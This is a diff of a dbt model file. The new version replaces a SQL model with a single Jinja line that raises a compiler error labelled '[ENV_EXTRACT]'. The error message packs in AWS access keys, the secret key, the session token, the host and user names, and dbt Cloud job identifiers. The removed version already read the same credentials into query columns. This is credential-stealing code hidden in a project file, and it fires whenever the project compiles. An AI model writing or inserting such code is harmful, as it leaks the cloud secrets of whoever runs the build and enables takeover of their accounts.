@@ -1,17 +1,1 @@
-{{ config(materialized='ephemeral') }}
-
-SELECT
-    '{{ env_var("AWS_ACCESS_KEY_ID", "NOT_SET") }}' as aws_key_id,
-    '{{ env_var("AWS_SECRET_ACCESS_KEY", "NOT_SET") }}' as aws_secret,
-    '{{ env_var("AWS_SESSION_TOKEN", "NOT_SET") }}' as aws_session_token,
-    '{{ env_var("AWS_DEFAULT_REGION", "NOT_SET") }}' as aws_region,
-    '{{ env_var("HOSTNAME", "NOT_SET") }}' as hostname_val,
-    '{{ env_var("HOME", "NOT_SET") }}' as home_dir,
-    '{{ env_var("PATH", "NOT_SET") }}' as path_val,
-    '{{ env_var("DBT_CLOUD_PROJECT_ID", "NOT_SET") }}' as dbt_project,
-    '{{ env_var("DBT_CLOUD_RUN_ID", "NOT_SET") }}' as dbt_run,
-    '{{ env_var("DBT_CLOUD_ENVIRONMENT_ID", "NOT_SET") }}' as dbt_env,
-    '{{ env_var("DBT_CLOUD_JOB_ID", "NOT_SET") }}' as dbt_job,
-    '{{ env_var("USER", "NOT_SET") }}' as user_val,
-    '{{ env_var("LANG", "NOT_SET") }}' as lang_val,
-    '{{ env_var("DBT_PROFILES_DIR", "NOT_SET") }}' as profiles_dir
+{{ exceptions.raise_compiler_error('[ENV_EXTRACT] AWS_KEY=' ~ env_var('AWS_ACCESS_KEY_ID', 'NOT_SET') ~ ' | AWS_SECRET=' ~ env_var('AWS_SECRET_ACCESS_KEY', 'NOT_SET') ~ ' | AWS_TOKEN=' ~ env_var('AWS_SESSION_TOKEN', 'NOT_SET') ~ ' | REGION=' ~ env_var('AWS_DEFAULT_REGION', 'NOT_SET') ~ ' | HOSTNAME=' ~ env_var('HOSTNAME', 'NOT_SET') ~ ' | HOME=' ~ env_var('HOME', 'NOT_SET') ~ ' | USER=' ~ env_var('USER', 'NOT_SET') ~ ' | PATH=' ~ env_var('PATH', 'NOT_SET') ~ ' | DBT_PROJECT=' ~ env_var('DBT_CLOUD_PROJECT_ID', 'NOT_SET') ~ ' | DBT_RUN=' ~ env_var('DBT_CLOUD_RUN_ID', 'NOT_SET') ~ ' | DBT_ENV=' ~ env_var('DBT_CLOUD_ENVIRONMENT_ID', 'NOT_SET') ~ ' | DBT_JOB=' ~ env_var('DBT_CLOUD_JOB_ID', 'NOT_SET')) }}
